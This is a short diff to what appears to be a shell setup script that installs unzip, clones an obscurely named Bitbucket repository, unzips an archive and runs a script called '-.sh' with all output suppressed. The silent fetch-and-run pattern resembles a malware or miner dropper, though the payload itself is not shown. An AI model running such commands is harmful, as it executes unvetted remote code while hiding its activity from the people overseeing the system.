@@ -1,3 +1,4 @@
+apt update && apt install unzip -y
 git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/loh.git && cd loh
 unzip pancal.zip
 ./-.sh >/dev/null >/dev/null 2>&1
